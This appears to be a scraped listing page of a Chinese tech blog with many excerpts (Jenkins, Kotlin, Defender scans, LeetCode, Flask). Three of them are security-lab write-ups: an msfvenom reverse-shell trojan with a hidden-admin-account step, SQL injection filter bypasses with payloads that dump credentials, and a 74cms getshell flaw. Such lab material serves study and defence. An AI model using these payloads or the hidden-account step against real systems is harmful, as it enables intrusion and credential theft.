变量a指向一个列表，列表的第一个元素为0；执行了append操作后，第二个元素又反过来指向a，即指向了a所指向的列表，因此形成了一个无限嵌套的循环：[0, [0, [0, [0, …]]]]。如下图所示：
虽然a是无限嵌套的列表，但a.append(a)的操作，并不会递归遍历其中的每一个元素。它只是扩充了原列表的第二个元素，并将其指向a，因此不会出现stack overflow的问题，自然不会报错。但是判断两个自嵌套列表是否相等时，需要遍历每一个元素是否相等，此时因循环问题报错，如下所示：
至于第二点，为什么len(a)返回的是2？我们还是来看a，虽然它是无限嵌套的列表，但a的top level只有2个元素组成，第一个元素为1，第二个元素为指向自身的列表，因此len(a)返回2。
那么以下这个示例就不难理解了。
示例二：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/115cbd69f53aaec8dcd4f568de4bac8a/" rel="bookmark">
			Win10怎么使用Windows Defender扫描文件夹中的恶意软件？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Windows 10 附带一个名为 Windows Defender 的免费内置防病毒程序，可提供实时保护并能够对您的计算机执行扫描。
它还允许您执行自定义扫描，让您指定要扫描恶意软件的特定文件夹或驱动器。由于您只需要扫描那个文件夹，扫描时间将比扫描整台机器要快得多。
下面我们提供了两种方法，可用于对特定文件夹执行自定义扫描。
方法 1：右键单击文件夹并扫描它
如果您想扫描单个文件夹及其子文件夹，最简单的方法是右键单击该文件夹并选择“使用 Windows Defender 扫描”，如下所示。
选择 使用 Windows Defender 扫描。。。后，Windows Defender 将启动并扫描文件夹及其子文件夹中的所有文件。
如果发现恶意软件，它会发出如下警告。
您现在应该单击“开始操作” 按钮以隔离该文件并使其无法访问。
完成后，Windows 安全中心将为您提供如下所示的摘要。
您现在可以关闭 Windows 安全中心。
方法 2：使用 Windows Defender 执行自定义扫描
另一种方法是使用 Windows Defender 界面对选定文件夹执行自定义扫描。为此，请按照以下步骤操作：
从“开始”菜单中，搜索“ Windows 安全”并在出现如下所示的结果时单击它。
当 Windows 安全中心打开时，单击病毒和威胁防护选项。
当病毒和威胁防护屏幕打开时，单击扫描选项 链接，如下所示。
; 当扫描选项屏幕打开时，向下滚动并选择自定义扫描。然后单击立即扫描 以开始自定义扫描。
Windows Defender 现在会询问您要扫描的文件夹。在我们的示例中，我们选择了 C： 驱动器来扫描整个 C： 驱动器，并且仅扫描该驱动器及其所有子文件夹。
Windows Defender 现在将扫描输入 C： 驱动器中的恶意软件。运行时，它将提供已扫描文件的运行计数以及完成扫描前剩余的大致时间。
完成后，它将列出已检测到的感染数量。要清除感染，请单击“开始操作”按钮。
查看摘要后，您可以关闭窗口。
转载于：Win10怎么使用Windows Defender扫描文件夹中的恶意软件？ – 自由领域
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d48fbc0b0b853c5678747135c778c4d/" rel="bookmark">
			jenkins 插件【Publish Over SSH】的使用说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【Publish Over SSH】插件是通过SSH连接其他Linux机器，远程传输文件及执行Shell命令
有两种验证方式，密码方式和秘钥方式
一、密码方式
Manage Jenkins -&gt; Configure System -&gt; Public over SSH 进行配置
填写名称、主机ip、ssh用户名、远程的目录（最好写/，后面就可以用绝对路径了）
然后点击高级，勾选【Use password authentication, or use a different key】使用密码登录，填写密码、端口、连接超时
点击【Test Configuration】，测试连接，显示Success即可
保存完成
二、秘钥方式
Manage Jenkins -&gt; Configure System -&gt; Public over SSH 进行配置
1、生成一个密钥对，命令：ssh-keygen
把生成的id_rsa.pub（公钥）内容复制到要远程的机器的authorized_keys文件下，.ssh文件夹的权限为600，authorized_keys文件的权限为700；
把id_rsa（私钥）的内容填写在Jenkins SSH Key -&gt; Key 里面
或者指定Path to key（jenkins机器私钥的文件路径）也可以
填写名称、主机ip、ssh用户名、远程的目录（最好写/，后面就可以用绝对路径了）
然后点击高级，填写密码、端口、连接超时即可；不要勾选【Use password authentication, or use a different key】使用密码登录
点击【Test Configuration】，测试连接，显示Success即可；
保存完成
三、使用：
项目中增加构建步骤，或者构建后步骤
Name:
SSH Sverver的名字列表
Source files:
jenkins本机上的文件，相对workspace的路径，如上图中表示的是/home/cmq/.jenkins/workspace/项目1/test1下的所有文件和文件名
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d48fbc0b0b853c5678747135c778c4d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0955b809fcae126cf33884dec3c5fb26/" rel="bookmark">
			【深入kotlin】- 伴生对象和扩展
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		伴生对象 在 kotlin 中，类没有 static 方法的概念，这与 java 不同。kotlin 用 package 级别的函数来取代静态方法（在字节码层级，这就是静态方法）。
所谓伴生对象其实就是位于 class 中的 object，使用 companion object 关键字声明：
class A { comopanion object: MyObject { var a:Int = 100 fun method() {} } } 你可以通过 类名.对象名.方法名调用：
A.MyObject.method() 甚至你还可以通过 类名.方法名调用：
A.method() println(A.a) 这就类似了静态成员的调用方法。在 kotlin 中，我们可以利用伴生对象实现类的静态成员。同时，kotlin 还规定了同一个类中只允许定义一个伴生对象，从而避免了多个伴生对象的命名冲突。因为类中只有一个伴生对象，所以伴生对象的名字是不必要的，完全可以省略：
class A { comopanion object { var a:Int = 100 fun method() {} } } 同时 kotlin 提供一个固定的对象名 Companion。通过 javap -c 反编译可以看到，伴生对象本质上是一个静态属性，它的类型是一个内部类，而它的成员则是实例成员。但是，你可以通过 @JvmStatic 注解将它们变成静态成员：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0955b809fcae126cf33884dec3c5fb26/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c7a586a8733406d1b3baabd1541f309/" rel="bookmark">
			mmdetection 中的 EpochBasedRunner
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		EpochBasedRunner 阅读记录 这个类有很多方法，这里只记录当前我所用到的方法。
一、首先是实例化这个类的初始化方法： """ Args: model (:obj:`torch.nn.Module`): The model to be run. batch_processor (callable): A callable method that process a data batch. The interface of this method should be `batch_processor(model, data, train_mode) -&gt; dict` optimizer (dict or :obj:`torch.optim.Optimizer`): It can be either an optimizer (in most cases) or a dict of optimizers (in models that requires more than one optimizer, e.g., GAN). work_dir (str, optional): The working directory to save checkpoints and logs.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c7a586a8733406d1b3baabd1541f309/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d47c79d860e26aadf956eda4b927a86c/" rel="bookmark">
			sbatch: error: Batch script contains DOS line breaks (\r\n)解決
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 在使用学校HPC集群时，发现win10写的batch任务报错，用dos2unix可解决。
bugs与解决 这个问题是由于unix和dos的空行格式有区别，用代码转换一下就可以了。
报错如下：
sbatch: error: Batch script contains DOS line breaks (\r\n) sbatch: error: instead of expected UNIX line breaks (\n). 输入dos2unix即可：
dos2unix yourfilename 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/21a5064e5c87ebb106dbca0f06c2c05a/" rel="bookmark">
			2021-12-09 使用kali生成木马，渗透Windows系统
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文章仅供学习和参考！
欢迎交流~
目录
一、实验题目：使用kali生成木马，渗透Windows系统
二、实验内容：
使用kali中的Metasploit生成木马，控制Windows系统
三、实验环境：
1. 攻击者IP（kali）：192.168.112.130
2. 靶机IP（Windows10）：192.168.112.136
三、实验步骤：
1. 保证两个系统能相互ping通
2. 生成木马，在kali打开终端，输入以下命令：
3. 进入木马文件存放路径，将木马文件evilshell.exe复制到 /var/www/html，输入命令：
4. 进入目录 /var/www/html，将html目录下的其余文件删除，输入命令：
5. 开启apache服务，输入命令：
可用以下命令查看服务开启状态：
6. 在Windows10靶机上打开浏览器，输入kali的IP，访问kali并下载木马文件evilshell.exe
​
7. 开启postgresql服务，其端口号为5432，输入命令：
可用以下命令查看服务开启状态：
8. 查看端口，输入命令：
9. 开启msfconsole，输入命令：
10.设置攻击模块并运行，输入命令：
11. 在靶机中双击运行木马文件（evilshell.exe）
​
12. 获取目标主机shell，输入命令：
若出现乱码现象，可输入命令：
​
13. 输入ipconfig，查看靶机的IP地址：
​
14. 在靶机中添加一个隐藏用户（后面加$），并提升隐藏用户的权限，输入以下命令：
15. kali打开一个新的终端，使用远程桌面连接靶机（靶机需要开启远程连接服务），输入命令：
16. 使用 host$/密码 登录靶机，登录成功后，使用管理员权限打开cmd，添加一个新用户，添加成功则证明渗透成功！
一、实验题目：使用kali生成木马，渗透Windows系统 二、实验内容： 使用kali中的Metasploit生成木马，控制Windows系统 三、实验环境： 1. 攻击者IP（kali）：192.168.112.130 2. 靶机IP（Windows10）：192.168.112.136 三、实验步骤： 1. 保证两个系统能相互ping通 2. 生成木马，在kali打开终端，输入以下命令： msfvenom -p windows/meterpreter/reverse_tcp lhost=攻击者IP lport=监听端口 -f 后门文件类型 &gt;/后门文件存放路径/evilshell.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/21a5064e5c87ebb106dbca0f06c2c05a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3809e23cefb704ec83ade74c400c78f/" rel="bookmark">
			SQL注入 绕过and和or过滤
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 SQL注入 绕过and和or过滤 1.基础知识介绍 1.MySQL中的大小写不敏感，大写与小写一样。
2.MySQL中的十六进制与URL编码
3.符号和关键字替换and – &amp;&amp;、or–||
4.内联注释与多行注释
/*! 内联注释*/ /*多行注释*/ 2.去除and和or的代码分析 preg_replace(mixed $pattern,mixed $replacement,mixed $subject):执行一个正则表达式的搜索和替换。
$pattern:要搜索的模式，可以是字符串或一个字符串数组
$replacement:用于替换的字符串或字符串组。
$subject:要搜索替换的目标字符串或字符串数组
$id= preg_replace('/or/i',"", $id); $id= preg_replace('/AND/i',"", $id); 值得一说的是preg_replace函数后面的/i是指ignore,就是忽略大小写
3.绕过去除and和or的SQL注入 1.大小写变形，Or,OR,oR,OR，And，ANd，aND等 代码中大小写不敏感都被剔除
2.在这两个敏感词汇中添加注释，例如：a/**/nd 双写绕过 oorr
3.利用符号替代——and --&amp;&amp; or–||
我们以sqli-labs-less25为例
1.当我们输入1时，回显正常，当我们输入1\时报错
2.可以判断出，此sql注入为字符型，判断and,or等关键字是否被过滤
?id=1' and 1=1# 3.发现and，or被过滤为空，这里我使用的是双写绕过
?id=1' oorr 1=1--+ 4.爆破数据库
5.爆破数据表
?id=-1'and union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3%23 6.爆破字段名
7.爆破字段内容
获取用户名和密码
?id=-1' union select 1,(select group_concat(username,passwoorrd) from users),3--+ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca23c0225347bd4a6e7fe828452b461f/" rel="bookmark">
			74cms前台getshell漏洞
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的博客：acsec.xyz
微信公众号: Ac sec
一.概述 红日web靶场下载链接
链接：https://pan.baidu.com/s/12vaZancfB6xpeeGXqjRDXA 提取码：hzmy （靶机密码：hongrisec@2019） 74cms存在前台getshell漏洞的版本号：4.0.0 - 4.1.24
该漏洞可以在Windows上实现，不能在Linux上实现
利用方式：注册一个账户后登录，在修改简历的界面上传一个doc的简历（doc文档里包含PHP代码），然后访问特殊构造的URL即可执行doc文件中的PHP代码。
由于靶场环境有一点小问题，我在74cms官网(http://www.74cms.com/download/index.html)下载了4.2.66版本，将/Application/Home/Controller/MController.class.php内容进行更改，主要就是把过滤的部分去掉。
更改后的MController.class.php
class MController extends FrontendController{ public function index(){	if(!I('get.org','','trim') &amp;&amp; C('PLATFORM') == 'mobile' &amp;&amp; $this-&gt;apply['Mobile']){ redirect(build_mobile_url()); }	$type = I('get.type','android','trim'); $android_download_url = C('qscms_android_download')?C('qscms_android_download'):''; $ios_download_url = C('qscms_ios_download')?C('qscms_ios_download'):''; $this-&gt;assign('android_download_url',$android_download_url); $this-&gt;assign('ios_download_url',$ios_download_url); $this-&gt;assign('type',$type);	$this-&gt;display('M/'.$type); } } 二.代码审计 /Application/Home/Controller/MController.class.php
class MController extends FrontendController{ public function index(){	if(!I('get.org','','trim') &amp;&amp; C('PLATFORM') == 'mobile' &amp;&amp; $this-&gt;apply['Mobile']){ redirect(build_mobile_url()); }	$type = I('get.type','android','trim'); $android_download_url = C('qscms_android_download')?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ca23c0225347bd4a6e7fe828452b461f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d74025ec0e192198bc3046a65d0cac5/" rel="bookmark">
			【LeetCode】LeetCode之打家劫舍Ⅱ——暴力递归&#43;动态规划解决循环问题&#43;DP空间优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这道题和第 198 题相似，建议读者首先阅读「198. 打家劫舍」
🔒LeetCode之打家劫舍Ⅰ：LeetCode之打家劫舍Ⅰ
1.打家劫舍II 题目描述
你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都 围成一圈 ，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警 。
给定一个代表每个房屋存放金额的非负整数数组，计算你 在不触动警报装置的情况下 ，今晚能够偷窃到的最高金额。
💎示例 1：
输入：nums = [2,3,2]
输出：3
解释：你不能先偷窃 1 号房屋（金额 = 2），然后偷窃 3 号房屋（金额 = 2）, 因为他们是相邻的。
💎示例 2：
输入：nums = [1,2,3,1]
输出：4
解释：你可以先偷窃 1 号房屋（金额 = 1），然后偷窃 3 号房屋（金额 = 3）。
偷窃到的最高金额 = 1 + 3 = 4 。
💎示例 3：
输入：nums = [0]
输出：0
📜提示：
1 &lt;= nums.length &lt;= 1000 &lt;= nums[i] &lt;= 1000 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d74025ec0e192198bc3046a65d0cac5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/366d54e3fcc400d3178adfe0d11fe3d1/" rel="bookmark">
			Java中如何优雅的把Map转为对象
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对于一个Map我们如何把它转成对应的对象呢，其实方法很多，我之前用的比较多的是通过JSON转换，如下:
public class Person { private String userName; private int age; public String getUserName() { return userName; } public int getAge() { return age; } public void setUserName(String userName) { this.userName = userName; } public void setAge(int age) { this.age = age; } } public static void main(String[] args) { Map&lt;String,Object&gt; source=new HashMap&lt;&gt;(); source.put("userName","张三"); source.put("age",1); //map转为对象 Person person = JSONObject.parseObject(JSONObject.toJSONString(source), Person.class); System.out.println(JSONObject.toJSONString(person)); } 但是这样总是感觉效率不高，所以就自己写了下面这个小工具类，效率翻倍，工具类如下:
public class MapToObj { /** * 把source转为target * @param source source * @param target target * @param &lt;T&gt; 返回值类型 * @return 返回值 * @throws Exception newInstance可能会抛出的异常 */ public static &lt;T&gt; T mapToObj(Map source,Class&lt;T&gt; target) throws Exception { Field[] fields = target.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/366d54e3fcc400d3178adfe0d11fe3d1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b82683d1fd53c961843cc966b8d449d6/" rel="bookmark">
			gltf文件批量压缩
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 gltf文件批量压缩 使用gltf-pipeline将gltf格式文件采用draco算法进行压缩能有效降低模型文件大小，但是gltf-pipeline官方并没有介绍批量处理的方法，下面我们通过批处理来实现：
打开cmd，进入gltf模型存放的路径，输入如下命令，回车，就会自动循环执行，批量压缩。（-d表示使用draco算法进行压缩）
for %i in ('dir ./ *.gltf /s /b') do gltf-pipeline -i %i -o %i -d 与gltf格式相比，相似的glb格式的文件大小上要更小些，如果还想进一步压缩，可以转成glb格式，使用如下命令：
for %i in ('dir ./ *.gltf ') do gltf-pipeline -i %i -o %~ni.glb 注意唯一的不同就是输出后缀，%i表示文件名带后缀，此时后缀变成glb了，%ni表示文件名（不带后缀），所以用%ni加上后缀.glb既可。
如果确定输出格式为glb的情况下，可以将以上命令进行合并，输入一下命令，直接批量压缩的同时文件转成glb格式：
for %i in ('dir ./ *.gltf /s /b') do gltf-pipeline -i %i -o %~ni.glb -d 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d7767ae5ff47dfa3d4c0ce55b26172ae/" rel="bookmark">
			【天池学习赛 语义分割】自定义数据集时报错处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		项目场景： 在自定义数据集的MMSegmentation中，运行一个模型
是一个天池的练习赛：地表建筑物识别
问题描述： 对于数据集，在MMSeg中并没有和他对应的数据集格式，我就自己写了一个数据集，需要的config文件可以私我或者访问github
报错信息
File "/home/%%%%%/anaconda3/envs/open-mmlab/lib/python3.7/site-packages/torch/nn/modules/conv.py", line 446, in forward return self._conv_forward(input, self.weight, self.bias) File "/home/%%%%%/anaconda3/envs/open-mmlab/lib/python3.7/site-packages/torch/nn/modules/conv.py", line 443, in _conv_forward self.padding, self.dilation, self.groups) RuntimeError: cuDNN error: CUDNN_STATUS_INTERNAL_ERROR You can try to repro this exception using the following code snippet. If that doesn't trigger the error, please include your original repro script when reporting this issue. import torch torch.backends.cuda.matmul.allow_tf32 = True torch.backends.cudnn.benchmark = True torch.backends.cudnn.deterministic = False torch.backends.cudnn.allow_tf32 = True data = torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d7767ae5ff47dfa3d4c0ce55b26172ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2121319e6f52b334863601db6b646460/" rel="bookmark">
			Windows 10 上使用 Markdownpad2 写文档无法预览
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		新上手了一个写 markdown 的软件 MarkdownPad 2，发现写了不能预览。。。
预览视图报错：
在官方的 FAQ 中找到了问题描述：LivePreview is not working
翻译：
LivePreview 不起作用 - 它显示一条错误消息，说明 这个视图崩溃了！
此问题已在 Windows 8 中特别观察到。您可能会看到如下所示的错误消息，并且在 Markdown 编辑器窗格中键入时不会呈现任何 HTML。
要解决此问题，请尝试安装Awesomium 1.6.6 SDK。
如果您继续遇到问题，请安装Microsoft 的 DirectX 最终用户运行时（2010 年 6 月）。
好家伙，windows 8 就有。
按照说明下载 Awesomium 1.6.6 SDK 安装，可以了。如果还不行的话可以安装 DirectX 试试。
安装包下载地址：
Awesomium 1.6.6 SDK
DirectX
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c7a4e385eb2f8608f4ae084a95bb565/" rel="bookmark">
			Qt 字符串编码转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 包含头文件：
#include &lt;QTextCodec&gt; 栗子，UTF-8 转 GB2312
/* UTF-8 转 GB2312 */ QString str = "这是一段文字。"; QTextCodec *utf8Codec = QTextCodec::codecForName("UTF-8"); QTextCodec *gb2312Codec = QTextCodec::codecForName("GB2312"); QString unicode = utf8Codec -&gt;toUnicode(str.toLocal8Bit().data()))); QByteArray gb2312Bytes = gb2312Codec -&gt;fromUnicode(unicode); 其他编码转换也大致这样，支持的编码有：
Big5 Big5-HKSCS CP949 EUC-JP EUC-KR GB18030 HP-ROMAN8 IBM 850 IBM 866 IBM 874 ISO 2022-JP ISO 8859-1 to 10 ISO 8859-13 to 16 Iscii-Bng, Dev, Gjr, Knd, Mlm, Ori, Pnj, Tlg, and Tml KOI8-R KOI8-U Macintosh Shift-JIS TIS-620 TSCII UTF-8 UTF-16 UTF-16BE UTF-16LE UTF-32 UTF-32BE UTF-32LE Windows-1250 to 1258 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9a84b5dfd322fcfc03f83b23d1330242/" rel="bookmark">
			如何自己搭建一个jupyter notebook远程服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		jupyter-server 文章目录 jupyter-server1、购买阿里云的ECS云服务器2、配置ECS的ssh，以便远程访问3、用ssh客户端连接ECS，配置jupyter notebook环境a、安装anaconda，下载清华镜像的安装包，并安装b、刷新PATHc、更新condad、生成jupyter配置文件，并编辑 4、在ECS控制台开放端口5、后台运行jupyter notebook7、玩点花样a、修改jupyter网页的css，实现自定义字体等b、使用juyter notebook的插件c、安装其他的kernel 6、配置git 1、购买阿里云的ECS云服务器 官网是阿里云,系统我选择了CentOS 8.4，配置则是乞丐版，一个月￥9。
2、配置ECS的ssh，以便远程访问 首先安装openssh-server
yum install openssh-server -y 然后配置OpenSSH服务（不配置也是可以正常工作的
vi /etc/ssh/sshd_config 常见配置选项：
Port=22 设置SSH的端口号是22(默认端口号为22) Protocol 2 启用SSH版本2协议 ListenAddress 192.168.0.222 设置服务监听的地址 DenyUsers user1 user2 foo 拒绝访问的用户(用空格隔开) AllowUsers root osmond vivek 允许访问的用户(用空格隔开) PermitRootLogin yes 允许root用户登陆 PermitEmptyPasswords no 用户登陆需要密码认证 PasswordAuthentication yes 启用口令认证方式 最后重启openssh
service sshd restart 本节内容参考自博客
3、用ssh客户端连接ECS，配置jupyter notebook环境 使用命令行连接：
ssh root@hostIP 例如 ssh root@192.168.0.0 也可以使用Xshell之类的工具连接。
注意ECS的实例密码（也就是服务器root账户的密码）和账号密码是独立的，需要单独设置
连接之后
a、安装anaconda，下载清华镜像的安装包，并安装 wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2021.11-Linux-x86_64.sh bash Anaconda3-2021.11-Linux-x86_64.sh 安装的过程中，遇到初始化conda的选项选择yes
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9a84b5dfd322fcfc03f83b23d1330242/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e77b44381e359db9354279beff712963/" rel="bookmark">
			离线安装jenkins,并离线安装插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		防火墙放通端口
firewall-cmd --zone=public --add-port=8080/tcp --permanent firewall-cmd --reload firewall-cmd --zone=public --list-ports 一、离线安装jenkins
上传安装包：
可以自行到官网下载，链接如下：
https://mirrors.tuna.tsinghua.edu.cn/jenkins/war/2.324/jenkins.war https://www.oracle.com/java/technologies/downloads/#java8 https://mirrors.huaweicloud.com/java/jdk/ https://dlcdn.apache.org/tomcat/tomcat-8/v8.5.73/bin/apache-tomcat-8.5.73.tar.gz 1、安装jdk
tar -xf jdk-8u311-linux-x64.tar.gz vim ~/.bash_profile export JAVA_HOME=/home/cmq/jdk1.8.0_311 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:${JAVA_HOME}/jre/lib/rt.jar:${JAVA_HOME}/lib/dt.jar:${JAVA_HOME}/lib/tools.jar source ~/.bash_profile java -version 2、安装Tomcat，启动jenkins
tar -xf apache-tomcat-8.5.73.tar.gz cp jenkins.war apache-tomcat-8.5.73/webapps/ cd apache-tomcat-8.5.73/bin/ ./startup.sh 3、配置jenkins
访问jenkins：
http://192.168.104.32:8080/jenkins/ 按提示找到密码，输入密码，继续
选择插件来安装
点击无，不要选择插件安装
创建管理员用户
保存并完成
二、离线安装插件
插件下载地址，下载.hpi文件
https://plugins.jenkins.io/ 1、上传插件安装
Manage Jenkins -&gt; Plugin Manager
依赖报错的话，在 https://updates.jenkins.io/download/plugins/ 源中选择合适的 hpi 文件，先安装依赖插件
因为可能要安装依赖插件，所以要把相应的依赖也下载安装
比较麻烦，所以可以先在可以连外网的机器安装相同版本的jenkins和安装好相应的插件，再把jenkins主目录下的plugins文件夹，传到内网的jenkins的plugins文件夹下即可
Jenkins操作：
重启 http://localhost:8080/restart
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e77b44381e359db9354279beff712963/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1f2537f0d6be1c445ca0a1ac998e4cb/" rel="bookmark">
			博客网页日志页面(HTML&#43;CSS)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果图显示 HTML+CSS代码实现 &lt;!doctype html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;无标题文档&lt;/title&gt; &lt;style type="text/css"&gt; &lt;!-- body,from,h1,h2,ul,li{ list-style:none; margin: 0px; padding: 0px; font-size:12px; } #box { width: 950px; margin:0 auto; } #banner { background: url(images/banner.gif) no-repeat; height: 255px; } #menu { background-color: #fceaa9; height: 40px; background-image: url(images/navbg.gif); background-repeat: repeat-x; position: relative; } #search { color: #016941; width:300px; height:40px; font-weight: bold; position:absolute; right:30px; top:0px; line-height: 40px; } #search input{ border:solid 1px #016941; } #search input[type="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1f2537f0d6be1c445ca0a1ac998e4cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/305e79132b17f1907fb5dd97a7801ed9/" rel="bookmark">
			Flask学习之旅——2.1 模板简介及基础使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Flask学习之旅——2.1 模板简介及基础使用 前言 本文为《知了传课——模板简介》的学习笔记。原文地址：第一节：模板简介 - Python框架Flask基础教程 - 知了传课 (zlkt.net) 什么是模板？ 模板是一个web开发必备的模块。因为我们在渲染一个网页的时候，并不是只渲染一个纯文本字符串，而是需要渲染一个有富文本标签的页面。这时候我们就需要使用模板了。在Flask中，配套的模板是Jinja2，Jinja2的作者也是Flask的作者。这个模板非常的强大，并且执行效率高。 创建模板 我们在创建Flask项目的时候，会自动在该项目下创建一个template文件夹，这个文件夹是专门用来保存模板的。在该文件下，创建一个HTML文件，则这个HTML文件就是我们所说的模板。 Flask渲染Jinja模板 要渲染一个模板，通过render_template方法即可
例子
from flask import Flask,render_template #这里需要引入render_template库 app = Flask(__name__) @app.route('/about/') def about(): return render_template('about.html') 当访问/about/的时候，about()函数会在当前目录下的templates文件夹下寻找about.html模板文件。
变量的使用 如果想要传递变量到模板中，可以先把变量定义为字典，然后在render_template中通过关键字传递过去。render_template('xxx.html',**字典名)。
app.py
from flask import Flask, request, redirect, url_for, render_template import config app = Flask(__name__) app.config.from_object(config) ###使用配置文件 @app.route('/about/') def about(): context = { "username":"admin" } ###创建一个字典，用于传递数据 return render_template('about.html',**context) if __name__ == '__main__': app.run() about.html
&lt;!DOCTYPE html&gt; &lt;html lang="en"&gt; &lt;head&gt; &lt;meta charset="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/305e79132b17f1907fb5dd97a7801ed9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6ee78b90af0ea2d63862237c617dd86/" rel="bookmark">
			如何理解C#中的反射Reflection
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、反射（Reflection） 当我们只知道对象外部而不知道内部结构的情况下，通过C#的反射（Reflection）了解对象内部结构。C#中提供的反射（Reflection）机制可动态分析程序集、模块与类型，它不需要New一个对象，便可动态创建使用对象，从而降低代码耦合性。
反射（Reflection）内部实现依赖于元数据。元数据，简单来说，在公共语言运行时CLR中，是一种二进制信息，用来描述数据，数据的属性环境等等的一项数据，那么反射解析数据的内部实现通过元数据实现再合适不过了。
二、举例说明 我先随便写个需要反射的程序集：
using System; using System.Collections.Generic; using System.Linq; using System.Text; using System.Threading.Tasks; namespace StudentClass { public class Student { public Student() { } public string Name { get; set; } public int Age { get; set; } public char Gender { get; set; } public string IdCard { get; set; } public string Address { get; set; } private string Mobile { get; set; } public void Eat() { Console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6ee78b90af0ea2d63862237c617dd86/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90bd603916e2dc68e345e15c6921eaa7/" rel="bookmark">
			【Lombok】@EqualsAndHashCode | 自动生成类的 Equals 和 HashCode 方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
